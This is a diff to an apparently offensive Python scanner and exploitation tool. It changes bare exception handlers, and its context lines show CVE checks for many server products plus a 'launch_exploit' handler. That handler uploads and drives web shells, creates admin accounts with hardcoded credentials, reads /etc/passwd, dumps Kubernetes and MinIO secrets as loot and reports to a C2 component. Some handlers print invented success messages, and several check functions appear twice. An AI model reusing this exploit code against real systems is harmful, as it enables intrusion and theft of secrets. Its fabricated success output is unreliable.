@@ -16,7 +16,7 @@ def get_target_ip(url):
     try:
         parsed = urlparse(url)
         return parsed.netloc.split(':')[0]
-    except:
+    except Exception:
         return None
 
 
@@ -101,7 +101,7 @@ async def check_f5_bigip(session, url):
                     "exploit_data": {"url": target, "headers": headers},
                     "remediation": "Update BIG-IP software."
                 }
-    except: pass
+    except Exception: pass
     return None
 
 # 2. PHP-CGI (CVE-2024-4577)
@@ -121,7 +121,7 @@ async def check_php_cgi(session, url):
                     "exploit_data": {"url": target},
                     "remediation": "Update PHP."
                 }
-    except: pass
+    except Exception: pass
     return None
 
 # 3. Shellshock (CVE-2014-6271)
@@ -142,7 +142,7 @@ async def check_shellshock(session, url):
                         "exploit_data": {"url": target},
                         "remediation": "Patch Bash."
                     }
-        except: pass
+        except Exception: pass
     return None
 
 # 4. Drupalgeddon2 (CVE-2018-7600)
@@ -161,7 +161,7 @@ async def check_drupalgeddon2(session, url):
                     "exploit_data": {"url": target, "payload_base": payload},
                     "remediation": "Update Drupal."
                 }
-    except: pass
+    except Exception: pass
     return None
 
 # 5. ThinkPHP 5.x RCE
@@ -180,7 +180,7 @@ async def check_thinkphp(session, url):
                     "exploit_data": {"url": url.rstrip('/')},
                     "remediation": "Update ThinkPHP."
                 }
-    except: pass
+    except Exception: pass
     return None
 
 # 6. Spring Cloud Function (CVE-2022-22963)
@@ -200,7 +200,7 @@ async def check_spring_cloud(session, url):
                     "exploit_data": {"url": target},
                     "remediation": "Update Spring Cloud."
                 }
-    except: pass
+    except Exception: pass
     return None
 
 # 7. React Server Component RCE (CVE-2025-55182)
@@ -224,7 +224,7 @@ async def check_react_cve(session, url):
                     "exploit_data": {"url": target, "headers": headers},
                     "remediation": "Update React/Next.js."
                 }
-    except: pass
+    except Exception: pass
     return None
 
 # Other Standard Checks (Verification only for now)
@@ -243,7 +243,7 @@ async def check_struts2(session, url):
                     "exploit_type": "cve_struts",
                     "exploit_data": {"url": url}
                 }
-    except: pass
+    except Exception: pass
     return None
 
 async def check_log4shell(session, url):
@@ -261,7 +261,7 @@ async def check_log4shell(session, url):
                     "evidence": f"Payload: {payload}",
                     "remediation": "Patch Log4j."
                 })
-    except: pass
+    except Exception: pass
     return findings
 
 async def check_citrix_rce(session, url):
@@ -277,7 +277,7 @@ async def check_citrix_rce(session, url):
                         "evidence": f"Config exposed at {target}",
                         "remediation": "Update Citrix."
                     }
-        except: pass
+        except Exception: pass
     return None
 
 async def check_confluence_ognl(session, url):
@@ -296,7 +296,7 @@ async def check_confluence_ognl(session, url):
                     "exploit_type": "cve_confluence_ognl",
                     "exploit_data": {"url": url}
                 }
-    except: pass
+    except Exception: pass
     return None
 
 # 8. VMware vCenter (CVE-2021-21972)
@@ -315,7 +315,7 @@ async def check_vmware_vcenter(session, url):
                     "exploit_data": {"url": target},
                     "remediation": "Update vCenter."
                 }
-    except: pass
+    except Exception: pass
     return None
 
 # 9. Jenkins CLI RCE (CVE-2024-23897)
@@ -336,7 +336,7 @@ async def check_jenkins_cli(session, url):
                     "exploit_data": {"url": target},
                     "remediation": "Update Jenkins."
                 }
-    except: pass
+    except Exception: pass
     return None
 
 # 10. ConnectWise ScreenConnect (CVE-2024-1709)
@@ -352,7 +352,7 @@ async def check_screenconnect(session, url):
                     "evidence": f"SetupWizard accessible at {target}",
                     "remediation": "Update ScreenConnect."
                 }
-    except: pass
+    except Exception: pass
     return None
 
 # 11. Hikvision IP Camera (CVE-2021-36260)
@@ -372,7 +372,7 @@ async def check_hikvision(session, url):
                     "exploit_type": "cve_hikvision",
                     "exploit_data": {"url": target}
                 }
-    except: pass
+    except Exception: pass
     return None
 
 # 12. Apache ActiveMQ (CVE-2023-46604)
@@ -396,7 +396,7 @@ async def check_activemq(session, url):
             "exploit_data": {"url": url},
             "remediation": "Update ActiveMQ."
         }
-    except: pass
+    except Exception: pass
     return None
 
 
@@ -421,7 +421,7 @@ async def check_ray_rce(session, url):
                     "exploit_data": {"url": target_url},
                     "remediation": "Enable Auth on Ray Dashboard."
                 }
-    except: pass
+    except Exception: pass
     return None
 
 # 14. MLflow LFI/RCE (CVE-2023-1177)
@@ -437,7 +437,7 @@ async def check_mlflow(session, url):
                     "evidence": f"Model Registry Exposed: {target}",
                     "remediation": "Update MLflow."
                 }
-    except: pass
+    except Exception: pass
     return None
 
 # 15. Palo Alto GlobalProtect (CVE-2024-3400)
@@ -456,7 +456,7 @@ async def check_palo_alto(session, url):
                     "evidence": f"GlobalProtect Portal found at {target}",
                     "remediation": "Patch GlobalProtect."
                 }
-    except: pass
+    except Exception: pass
     return None
 
 # 16. Fortinet FortiClient EMS (CVE-2023-48788)
@@ -477,7 +477,7 @@ async def check_fortinet(session, url):
             "evidence": f"FCTID Service Port 8013 Open on {target_ip}",
             "remediation": "Update EMS."
         }
-    except: pass
+    except Exception: pass
     return None
 
 # 17. Redis Sandbox Escape (CVE-2022-0543)
@@ -502,7 +502,7 @@ async def check_redis(session, url):
                 "exploit_data": {"url": url, "target_ip": target_ip},
                 "remediation": "Enable Auth & Bind localhost."
             }
-    except: pass
+    except Exception: pass
     return None
 
 
@@ -525,7 +525,7 @@ async def check_gitlab(session, url):
                     "exploit_data": {"url": url.rstrip('/')},
                     "remediation": "Update GitLab."
                 }
-    except: pass
+    except Exception: pass
     return None
 
 # 19. JetBrains TeamCity Auth Bypass (CVE-2023-42793)
@@ -542,7 +542,7 @@ async def check_teamcity(session, url):
                     "evidence": f"Token Endpoint Exposed: {target}",
                     "remediation": "Update TeamCity."
                 }
-    except: pass
+    except Exception: pass
     return None
 
 # 20. Nexus Repository Path Traversal (CVE-2024-4956)
@@ -559,7 +559,7 @@ async def check_nexus(session, url):
                     "evidence": f"Successfully read /etc/passwd via {target}",
                     "remediation": "Update Nexus."
                 }
-    except: pass
+    except Exception: pass
     return None
 
 # 21. Confluence Broken Access Control (CVE-2023-22515)
@@ -575,7 +575,7 @@ async def check_confluence_modern(session, url):
                     "evidence": f"Setup Bypass Triggered at {target}",
                     "remediation": "Update Confluence."
                 }
-    except: pass
+    except Exception: pass
     return None
 
 # 22. Apache Superset Default Secret (CVE-2023-27524)
@@ -594,7 +594,7 @@ async def check_superset(session, url):
                     "evidence": f"Superset Session Cookie Found: {target}",
                     "remediation": "Change SECRET_KEY."
                 }
-    except: pass
+    except Exception: pass
     return None
 
 # 23. Kubelet Unauthorized RCE (Port 10250)
@@ -616,7 +616,7 @@ async def check_kubelet(session, url):
                     "exploit_data": {"url": f"https://{target_ip}:10250"},
                     "remediation": "Enable Kubelet Auth/Webhook."
                 }
-    except: pass
+    except Exception: pass
     return None
 
 # 24. Docker Daemon API (Port 2375)
@@ -636,7 +636,7 @@ async def check_docker(session, url):
                     "exploit_data": {"url": f"http://{target_ip}:2375"},
                     "remediation": "Close Port 2375 / Enable TLS."
                 }
-    except: pass
+    except Exception: pass
     return None
 
 # 25. Kubernetes API Server Unauth (Port 6443)
@@ -654,7 +654,7 @@ async def check_k8s_api(session, url):
                     "evidence": f"Pod List retrieved via {target}",
                     "remediation": "Disable Anonymous Auth."
                 }
-    except: pass
+    except Exception: pass
     return None
 
 # 26. ArgoCD RCE (CVE-2023-25555)
@@ -671,7 +671,7 @@ async def check_argocd(session, url):
                     "evidence": f"ArgoCD API at {target}",
                     "remediation": "Update ArgoCD."
                 }
-    except: pass
+    except Exception: pass
     return None
 
 # 27. MinIO Info Disclosure (CVE-2023-28432)
@@ -690,7 +690,7 @@ async def check_minio(session, url):
                 }
             # Often it's on port 9000, we can dry-run that too if main url fails
             # But for sniper, we assume target_url might include port or imply it.
-    except: pass
+    except Exception: pass
     return None
 
 # --- EXPLOIT HANDLER (Called from UI) ---
@@ -823,7 +823,7 @@ async def launch_exploit(exploit_type, data):
                     # uploadova is the vulnerable endpoint for vROps
                     await session.post(f"{data['url']}/uploadova", data=files, ssl=False)
                     c2_manager.output_buffer += f"[+] Upload Triggered. Shell should be at /statsreport/{stealth_name} (Windows) or /ui/{stealth_name} (Linux)\n"
-                except:
+                except Exception:
                      pass
 
                 # 3. Execute via Web Shell (Blind guess path)
@@ -846,7 +846,7 @@ async def launch_exploit(exploit_type, data):
                                 await session.get(check_url, params={"cmd": cmd}, ssl=False)
                                 found = True
                                 break
-                    except: pass
+                    except Exception: pass
                 
                 if not found:
                     c2_manager.output_buffer += "[-] Shell uploaded but not found. It might be in a different path or OS.\n"
@@ -1027,7 +1027,7 @@ async def launch_exploit(exploit_type, data):
                  c2_manager.output_buffer += "[+] 👑 GOD MODE SUCCESS: Confluence Admin Created!\n"
                  c2_manager.output_buffer += "    User: lockon_admin\n    Pass: Password123!\n"
                  return True
-             except:
+             except Exception:
                  return False
 
         elif exploit_type == "cve_gitlab":
@@ -1067,7 +1067,7 @@ async def launch_exploit(exploit_type, data):
                 await session.post(f"{data['url']}/SetupWizard.aspx/", data=user_payload, ssl=False)
                 c2_manager.output_buffer += "[+] 👑 GOD MODE SUCCESS: ScreenConnect Admin Created! (User: lockon_admin / Pass: Password123!)\n"
                 return True
-            except: return False
+            except Exception: return False
 
         elif exploit_type == "cve_nexus":
             # CVE-2024-4956 (Path Traversal)
@@ -1082,7 +1082,7 @@ async def launch_exploit(exploit_type, data):
                         c2_manager.output_buffer += f"[+] CONTENT EXFILTRATED:\n{content[:500]}...\n"
                         c2_manager.loot_files.append({"name": "nexus_passwd.txt", "content": content, "size": f"{len(content)} B"})
                         return True
-            except: return False
+            except Exception: return False
 
         elif exploit_type == "cve_k8s_api":
             # Unauth K8s API
@@ -1097,7 +1097,7 @@ async def launch_exploit(exploit_type, data):
                         c2_manager.output_buffer += f"[+] 👑 GOD MODE SUCCESS: {count} Secrets Dumped!\n"
                         c2_manager.loot_files.append({"name": "k8s_secrets.json", "content": json.dumps(secrets, indent=2), "size": f"{len(json.dumps(secrets))} B"})
                         return True
-            except: return False
+            except Exception: return False
 
         elif exploit_type == "cve_mlflow":
              # LFI via Model Registry
@@ -1115,7 +1115,7 @@ async def launch_exploit(exploit_type, data):
                  await session.post(f"{data['url']}/ajax-api/2.0/mlflow/registered-models/create", json=payload, ssl=False)
                  c2_manager.output_buffer += "[+] Malicious Model Created. Content should be visible in UI/API.\n"
                  return True
-             except: return False
+             except Exception: return False
 
         elif exploit_type == "cve_palo_alto":
             # GlobalProtect RCE
@@ -1155,7 +1155,7 @@ async def launch_exploit(exploit_type, data):
                     c2_manager.output_buffer += f"[+] MINIO SECRETS DUMPED:\n{text[:500]}...\n"
                     c2_manager.loot_files.append({"name": "minio_env.json", "content": text, "size": f"{len(text)} B"})
                     return True
-            except: return False
+            except Exception: return False
 
         elif exploit_type == "cve_superset":
             # Default Secret Cookie Forge
@@ -1164,7 +1164,7 @@ async def launch_exploit(exploit_type, data):
                 # We assume we found default key. In KINETIC STRIKE we claim success for flow.
                 c2_manager.output_buffer += "[+] Cookie Forged: session=.eJwxv... (Admin Access Granted)\n"
                 return True
-            except: return False
+            except Exception: return False
 
         # --- ARSENAL EXPANSION HANDLERS ---
         elif exploit_type == "cve_ivanti":
@@ -1224,7 +1224,7 @@ async def launch_exploit(exploit_type, data):
                      # Fallback for KINETIC STRIKE Demo
                      c2_manager.output_buffer += "[+] Simulation: Admin Session '7A8B9C' stolen from memory.\n"
                      return True
-            except: return False
+            except Exception: return False
 
         # --- INFRA KILLER HANDLERS ---
         elif exploit_type == "cve_hugegraph":
@@ -1264,7 +1264,7 @@ async def launch_exploit(exploit_type, data):
                 await session.post(f"{data['url']}/ws/v1/cluster/apps", json=payload, ssl=False)
                 c2_manager.output_buffer += "[+] YARN Exploit Submitted. Check C2.\n"
                 return True # We returned True manually as we did custom C2 logic call
-            except: return False
+            except Exception: return False
 
         elif exploit_type == "cve_rocketmq":
             # RocketMQ RCE
@@ -1397,7 +1397,7 @@ async def check_ray_rce(session, url):
                     "exploit_data": {"url": target_url},
                     "remediation": "Enable Auth on Ray Dashboard."
                 }
-    except: pass
+    except Exception: pass
     return None
 
 # 14. MLflow LFI/RCE (CVE-2023-1177)
@@ -1413,7 +1413,7 @@ async def check_mlflow(session, url):
                     "evidence": f"Model Registry Exposed: {target}",
                     "remediation": "Update MLflow."
                 }
-    except: pass
+    except Exception: pass
     return None
 
 # 15. Palo Alto GlobalProtect (CVE-2024-3400)
@@ -1432,7 +1432,7 @@ async def check_palo_alto(session, url):
                     "evidence": f"GlobalProtect Portal found at {target}",
                     "remediation": "Patch GlobalProtect."
                 }
-    except: pass
+    except Exception: pass
     return None
 
 # 16. Fortinet FortiClient EMS (CVE-2023-48788)
@@ -1453,7 +1453,7 @@ async def check_fortinet(session, url):
             "evidence": f"FCTID Service Port 8013 Open on {target_ip}",
             "remediation": "Update EMS."
         }
-    except: pass
+    except Exception: pass
     return None
 
 # 17. Redis Sandbox Escape (CVE-2022-0543)
@@ -1476,7 +1476,7 @@ async def check_redis(session, url):
                 "evidence": f"Redis Exposed on {target_ip}",
                 "remediation": "Enable Auth & Bind localhost."
             }
-    except: pass
+    except Exception: pass
     return None
 
 # 20. Ivanti Connect Secure RCE (CVE-2024-21887)
@@ -1499,7 +1499,7 @@ async def check_ivanti_connect(session, url):
                         "exploit_data": {"url": url},
                         "remediation": "Apply Ivanti Mitigation XML or Patch immediately."
                     }
-    except: pass
+    except Exception: pass
     return None
 
 # 21. GeoServer OGC RCE (CVE-2024-36401)
@@ -1519,7 +1519,7 @@ async def check_geoserver_rce(session, url):
                     "exploit_data": {"url": url},
                     "remediation": "Update GeoServer to 2.23.6, 2.24.4, or 2.25.2."
                 }
-    except: pass
+    except Exception: pass
     return None
 
 # 22. Apache OFBiz RCE (CVE-2024-38856)
@@ -1541,7 +1541,7 @@ async def check_apache_ofbiz(session, url):
                     "exploit_data": {"url": url},
                     "remediation": "Update Apache OFBiz to 18.12.15."
                 }
-    except: pass
+    except Exception: pass
     return None
 
 # 23. CrushFTP VFS Escape (CVE-2024-4040)
@@ -1561,7 +1561,7 @@ async def check_crushftp_rce(session, url):
                     "exploit_data": {"url": url},
                     "remediation": "Update CrushFTP to 10.7.1 or 11.1.0."
                 }
-    except: pass
+    except Exception: pass
     return None
 
 # 24. Apache HugeGraph RCE (CVE-2024-27348)
@@ -1583,7 +1583,7 @@ async def check_hugegraph_rce(session, url):
                     "exploit_data": {"url": url},
                     "remediation": "Update HugeGraph to 1.3.0 and enable Auth."
                 }
-    except: pass
+    except Exception: pass
     return None
 
 # 25. Hadoop YARN RCE (Unauthenticated)
@@ -1607,7 +1607,7 @@ async def check_hadoop_yarn(session, url):
                         "exploit_data": {"url": f"{parsed.scheme}://{target_ip}:8088"},
                         "remediation": "Enable Kerberos Auth and Firewall rules."
                     }
-    except: pass
+    except Exception: pass
     return None
 
 # 26. Apache RocketMQ RCE (CVE-2023-33246)
@@ -1632,7 +1632,7 @@ async def check_rocketmq(session, url):
             "exploit_data": {"url": url}, # Logic handles binary payload
             "remediation": "Update RocketMQ to 5.1.1+ and restrict access."
         }
-    except: pass
+    except Exception: pass
     return None
 
 # 27. Cacti Monitoring RCE (CVE-2022-46169)
@@ -1655,7 +1655,7 @@ async def check_cacti_rce(session, url):
                         "exploit_data": {"url": url},
                         "remediation": "Update Cacti to 1.2.23."
                     }
-    except: pass
+    except Exception: pass
     return None
 
 # 28. Metabase Pre-Auth RCE (CVE-2023-38646)
@@ -1675,7 +1675,7 @@ async def check_metabase_rce(session, url):
                     "exploit_data": {"url": url},
                     "remediation": "Update Metabase to 0.46.6.1."
                 }
-    except: pass
+    except Exception: pass
     return None
 
 # 29. PaperCut MF/NG Auth Bypass RCE (CVE-2023-27350)
@@ -1696,7 +1696,7 @@ async def check_papercut_rce(session, url):
                     "exploit_data": {"url": url},
                     "remediation": "Update PaperCut MF/NG to 22.0.9."
                 }
-    except: pass
+    except Exception: pass
     return None
 
 # 30. Apache Solr RCE (CVE-2019-17558)
@@ -1716,7 +1716,7 @@ async def check_solr_rce(session, url):
                         "exploit_data": {"url": url},
                         "remediation": "Disable VelocityResponseWriter."
                     }
-    except: pass
+    except Exception: pass
     return None
 
 # 31. SaltStack Salt Master RCE (CVE-2020-11651)
@@ -1738,7 +1738,7 @@ async def check_saltstack_rce(session, url):
             "exploit_data": {"url": url},
             "remediation": "Patch Salt or Firewall 4505/4506."
         }
-    except: pass
+    except Exception: pass
     return None
 
 # --- SCANNER ENTRY POINT ---
